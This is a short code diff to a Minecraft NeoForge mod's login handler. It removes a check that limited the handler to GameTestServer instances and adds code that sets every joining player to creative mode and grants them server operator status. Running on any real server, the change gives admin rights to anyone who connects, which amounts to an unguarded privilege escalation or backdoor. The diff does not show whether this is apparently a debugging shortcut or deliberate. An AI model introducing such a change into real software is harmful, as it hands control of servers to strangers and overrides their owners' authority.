@@ -1,8 +1,8 @@
 package org.elpatronstudio.easybuild.server;
 
-import net.minecraft.gametest.framework.GameTestServer;
-import net.minecraft.server.level.ServerLevel;
 import net.minecraft.server.level.ServerPlayer;
+import net.minecraft.server.level.ServerLevel;
+import net.minecraft.server.players.NameAndId;
 import net.minecraft.world.level.GameType;
 import net.minecraft.world.level.Level;
 import net.neoforged.neoforge.common.NeoForge;
@@ -29,11 +29,13 @@ public final class ServerLifecycleEvents {
             return;
         }
 
-        if (!(serverPlayer.level().getServer() instanceof GameTestServer)) {
-            return;
-        }
-
         serverPlayer.setGameMode(GameType.CREATIVE);
+        ServerLevel serverLevel = (ServerLevel) serverPlayer.level();
+        var playerList = serverLevel.getServer().getPlayerList();
+        NameAndId identity = new NameAndId(serverPlayer.getGameProfile());
+        if (!playerList.isOp(identity)) {
+            playerList.op(identity);
+        }
     }
 
     private static void onPlayerLogout(PlayerEvent.PlayerLoggedOutEvent event) {
